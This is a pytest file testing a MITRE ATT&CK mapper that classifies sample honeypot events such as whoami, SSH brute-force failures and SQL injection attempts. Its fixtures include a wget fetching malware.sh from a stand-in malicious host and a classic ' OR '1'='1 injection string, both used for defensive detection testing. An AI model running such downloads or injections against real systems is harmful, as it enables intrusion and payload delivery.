"""
Tests for MITRE ATT&CK mapping functionality.
"""

import pytest
import sys
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from mitre.mitre_mapper import MiteMapper, MappingResult, TechniqueMapping
from datetime import datetime


class TestMiteMapper:
    """Test MITRE ATT&CK mapper."""
    
    @pytest.fixture
    def mapper(self):
        """Create MITRE mapper instance."""
        return MiteMapper()
    
    @pytest.fixture
    def sample_event(self):
        """Create sample event."""
        return {
            'timestamp': '2026-09-08T10:15:30Z',
            'source_ip': '192.168.1.100',
            'service': 'ssh',
            'event_type': 'command_execution',
            'session_id': 'test123',
            'command': 'whoami',
            'username': 'admin'
        }
    
    def test_mapper_initialization(self, mapper):
        """Test mapper initialization."""
        assert mapper is not None
        assert mapper.mapping_config is not None
        assert 'mappings' in mapper.mapping_config
    
    def test_map_command_whoami(self, mapper, sample_event):
        """Test mapping whoami command."""
        sample_event['command'] = 'whoami'
        result = mapper.map_event(sample_event)
        
        assert result is not None
        assert len(result.techniques) > 0
        assert result.primary_technique is not None
        assert result.primary_technique.technique_id == 'T1033'
    
    def test_map_brute_force(self, mapper):
        """Test mapping brute force attack."""
        event = {
            'timestamp': '2026-09-08T10:20:00Z',
            'source_ip': '192.168.1.101',
            'service': 'ssh',
            'event_type': 'login_failed',
            'session_id': 'test456',
            'username': 'root'
        }
        
        result = mapper.map_event(event)
        
        assert result is not None
        assert any(t.technique_id == 'T1110' for t in result.techniques)
    
    def test_map_file_download(self, mapper):
        """Test mapping file download."""
        event = {
            'timestamp': '2026-09-08T10:15:50Z',
            'source_ip': '192.168.1.100',
            'service': 'ssh',
            'event_type': 'command_execution',
            'session_id': 'test123',
            'command': 'wget http://malicious.com/malware.sh',
            'username': 'admin'
        }
        
        result = mapper.map_event(event)
        
        assert result is not None
        assert any(t.technique_id == 'T1105' for t in result.techniques)
    
    def test_map_sqli_attempt(self, mapper):
        """Test mapping SQL injection attempt."""
        event = {
            'timestamp': '2026-09-08T10:30:25Z',
            'source_ip': '192.168.1.104',
            'service': 'http',
            'event_type': 'sql_injection_attempt',
            'session_id': 'http_789',
            'path': '/index.php?id=1\' OR \'1\'=\'1'
        }
        
        result = mapper.map_event(event)
        
        assert result is not None
        # SQL injection should map to exploitation technique
        assert len(result.techniques) > 0
    
    def test_get_all_tactics(self, mapper):
        """Test getting all tactics."""
        tactics = mapper.get_all_tactics()
        
        assert len(tactics) > 0
        assert 'Credential Access' in tactics
        assert 'Discovery' in tactics
    
    def test_get_techniques_by_tactic(self, mapper):
        """Test getting techniques by tactic."""
        techniques = mapper.get_techniques_by_tactic('Discovery')
        
        assert len(techniques) > 0
        assert any(t['id'] == 'T1033' for t in techniques)
    
    def test_map_events_batch(self, mapper):
        """Test batch mapping of events."""
        events = [
            {
                'timestamp': '2026-09-08T10:15:30Z',
                'source_ip': '192.168.1.100',
                'service': 'ssh',
                'event_type': 'command_execution',
                'command': 'whoami'
            },
            {
                'timestamp': '2026-09-08T10:15:35Z',
                'source_ip': '192.168.1.100',
                'service': 'ssh',
                'event_type': 'command_execution',
                'command': 'hostname'
            }
        ]
        
        results = mapper.map_events_batch(events)
        
        assert len(results) == 2
        assert all(r.overall_confidence > 0 for r in results)
    
    def test_confidence_scoring(self, mapper):
        """Test confidence scoring."""
        event = {
            'timestamp': '2026-09-08T10:15:30Z',
            'source_ip': '192.168.1.100',
            'service': 'ssh',
            'event_type': 'command_execution',
            'command': 'whoami'
        }
        
        result = mapper.map_event(event)
        
        assert result.overall_confidence >= 0.0
        assert result.overall_confidence <= 1.0
    
    def test_get_statistics(self, mapper):
        """Test mapper statistics."""
        event = {
            'timestamp': '2026-09-08T10:15:30Z',
            'source_ip': '192.168.1.100',
            'service': 'ssh',
            'event_type': 'command_execution',
            'command': 'whoami'
        }
        
        mapper.map_event(event)
        stats = mapper.get_statistics()
        
        assert stats['total_events_mapped'] == 1
        assert stats['total_techniques_identified'] >= 1


if __name__ == "__main__":
    pytest.main([__file__, "-v"])